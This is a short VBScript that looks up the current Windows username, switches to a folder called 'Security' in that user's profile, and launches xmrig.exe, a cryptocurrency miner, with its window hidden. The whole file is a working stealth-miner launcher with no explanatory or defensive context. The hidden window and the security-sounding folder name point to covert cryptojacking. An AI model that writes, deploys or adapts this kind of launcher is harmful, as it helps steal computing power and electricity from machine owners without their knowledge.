Set WshShell = CreateObject("WScript.Shell")
Dim UserName : UserName = WshShell.ExpandEnvironmentStrings("%USERNAME%")
WshShell.CurrentDirectory = "C:\Users\" & UserName & "\Security"
WshShell.Run "xmrig.exe", 0, False